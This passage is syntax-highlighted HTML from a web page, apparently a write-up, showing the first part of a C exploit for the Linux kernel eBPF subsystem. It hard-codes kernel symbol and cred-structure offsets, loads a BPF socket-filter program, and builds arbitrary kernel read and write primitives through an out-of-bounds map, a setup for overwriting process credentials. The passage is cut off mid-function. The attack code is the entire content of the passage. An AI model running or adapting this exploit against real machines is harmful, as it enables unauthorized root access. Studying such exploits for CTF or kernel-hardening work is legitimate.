    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="3" style="--fi-max-shown-lines:10;--fi-line-digit:3;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;syscall.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/bpf.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;bpf_insn.h&#34;</span><span class="cp">
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define ARRAY_MAP_OPS_OFFSET 0x10363a0
</span></span></span><span class="line"><span class="cl"><span class="cp">#define ARRAY_MAP_LOOKUP_ELEM_OFFSET 0x20e830
</span></span></span><span class="line"><span class="cl"><span class="cp">#define ARRAY_MAP_UPDATE_ELEM_OFFSET 0x20eeb0
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PERCPU_OFFSET 0x149c900
</span></span></span><span class="line"><span class="cl"><span class="cp">#define current_task 0x17bc0
</span></span></span><span class="line"><span class="cl"><span class="cp">#define INIT_CRED_OFFSET 0x1a6b880
</span></span></span><span class="line"><span class="cl"><span class="cp">#define CRED_OFFSET 0xad8
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">socks</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="o">-</span><span class="mi">1</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">oob_map_fd</span><span class="p">,</span> <span class="n">arb_read_write_map_fd</span><span class="p">,</span> <span class="n">info_map_fd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">bpf</span><span class="p">(</span><span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">attr</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">attr</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">bpf_prog_load</span><span class="p">(</span><span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">attr</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">bpf</span><span class="p">(</span><span class="n">BPF_PROG_LOAD</span><span class="p">,</span> <span class="n">attr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">bpf_map_create</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">key_size</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">value_size</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">max_entries</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">map_type</span> <span class="o">=</span> <span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">key_size</span> <span class="o">=</span> <span class="n">key_size</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">value_size</span> <span class="o">=</span> <span class="n">value_size</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">max_entries</span> <span class="o">=</span> <span class="n">max_entries</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">bpf</span><span class="p">(</span><span class="n">BPF_MAP_CREATE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">bpf_map_update_elem</span><span class="p">(</span><span class="kt">int</span> <span class="n">map_fd</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">key</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="o">*</span> <span class="n">value</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">flags</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">map_fd</span> <span class="o">=</span> <span class="n">map_fd</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">value</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="n">flags</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">bpf</span><span class="p">(</span><span class="n">BPF_MAP_UPDATE_ELEM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">bpf_map_lookup_elem</span><span class="p">(</span><span class="kt">int</span> <span class="n">map_fd</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">key</span><span class="p">,</span> <span class="kt">int</span> <span class="n">index</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">[</span><span class="mh">0x150</span><span class="o">/</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">map_fd</span> <span class="o">=</span> <span class="n">map_fd</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">bpf</span><span class="p">(</span><span class="n">BPF_MAP_LOOKUP_ELEM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">value</span><span class="p">[</span><span class="n">index</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">union</span> <span class="n">bpf_attr</span><span class="o">*</span> <span class="nf">create_bpf_prog</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="n">insns</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">insn_cnt</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">attr</span> <span class="o">=</span> <span class="p">(</span><span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="p">)</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">union</span> <span class="n">bpf_attr</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">attr</span><span class="o">-&gt;</span><span class="n">prog_type</span> <span class="o">=</span> <span class="n">BPF_PROG_TYPE_SOCKET_FILTER</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">attr</span><span class="o">-&gt;</span><span class="n">insn_cnt</span> <span class="o">=</span> <span class="n">insn_cnt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">attr</span><span class="o">-&gt;</span><span class="n">insns</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">insns</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">attr</span><span class="o">-&gt;</span><span class="n">license</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="s">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">attr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">arb_read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">req</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">bpf_map_update_elem</span><span class="p">(</span><span class="n">arb_read_write_map_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">socks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">bpf_map_lookup_elem</span><span class="p">(</span><span class="n">info_map_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">arb_write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">req</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">bpf_map_update_elem</span><span class="p">(</span><span class="n">arb_read_write_map_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">bpf_map_update_elem</span><span class="p">(</span><span class="n">info_map_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">val</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">socks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">bpf_map_lookup_elem</span><span class="p">(</span><span class="n">info_map_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">attach_socket</span><span class="p">(</span><span class="kt">int</span> <span class="n">prog_fd</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">socks</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nf">socketpair</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">socks</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;socketpair&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">setsockopt</span><span class="p">(</span><span class="n">socks</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_ATTACH_BPF</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prog_fd</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">prog_fd</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;setsockopt&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">setup_bpf_prog</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="n">insns</span><span class="p">,</span> <span class="n">uint</span> <span class="n">insncnt</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">prog</span> <span class="o">=</span> <span class="nf">create_bpf_prog</span><span class="p">(</span><span class="n">insns</span><span class="p">,</span> <span class="n">insncnt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">prog_fd</span> <span class="o">=</span> <span class="nf">bpf_prog_load</span><span class="p">(</span><span class="n">prog</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">prog_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;prog_load&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">attach_socket</span><span class="p">(</span><span class="n">prog_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// void setup_bpf_prog(struct bpf_insn *insns, uint insncnt) {
</span></span></span><span class="line"><span class="cl"><span class="c1">//     // 1. 定义一个足够大的缓冲区来存放内核日志
</span></span></span><span class="line"><span class="cl"><span class="c1">//     static char log_buf[1024 * 1024]; 
</span></span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="c1">//     union bpf_attr *prog = create_bpf_prog(insns, insncnt);
</span></span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="c1">//     // 2. 注入日志参数
</span></span></span><span class="line"><span class="cl"><span class="c1">//     prog-&gt;log_level = 2;           // 级别 2 会显示指令重写 (Patching) 详情
</span></span></span><span class="line"><span class="cl"><span class="c1">//     prog-&gt;log_buf = (uint64_t)log_buf;
</span></span></span><span class="line"><span class="cl"><span class="c1">//     prog-&gt;log_size = sizeof(log_buf);
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//     int prog_fd = bpf_prog_load(prog);
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//     // 3. 打印日志
</span></span></span><span class="line"><span class="cl"><span class="c1">//     // 无论成功还是失败，打印 log_buf 都能看到 Verifier 做了什么
</span></span></span><span class="line"><span class="cl"><span class="c1">//     if (prog_fd &lt; 0) {
</span></span></span><span class="line"><span class="cl"><span class="c1">//         printf(&#34;--- Verifier Log (Error) ---\n%s\n&#34;, log_buf);
</span></span></span><span class="line"><span class="cl"><span class="c1">//         perror(&#34;prog_load&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1">//         exit(1);
</span></span></span><span class="line"><span class="cl"><span class="c1">//     } else {
</span></span></span><span class="line"><span class="cl"><span class="c1">//         // 如果你想看成功加载后的指令（包含 ALU Sanitation），也打印出来
</span></span></span><span class="line"><span class="cl"><span class="c1">//         printf(&#34;--- Verifier Log (Success) ---\n%s\n&#34;, log_buf);
</span></span></span><span class="line"><span class="cl"><span class="c1">//     }
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//     attach_socket(prog_fd);
</span></span></span><span class="line"><span class="cl"><span class="c1">//     free(prog); // 记得释放 malloc 的内存
</span></span></span><span class="line"><span class="cl"><span class="c1">// }
</span></span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">run_bpf_prog</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="n">insns</span><span class="p">,</span> <span class="n">uint</span> <span class="n">insncnt</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
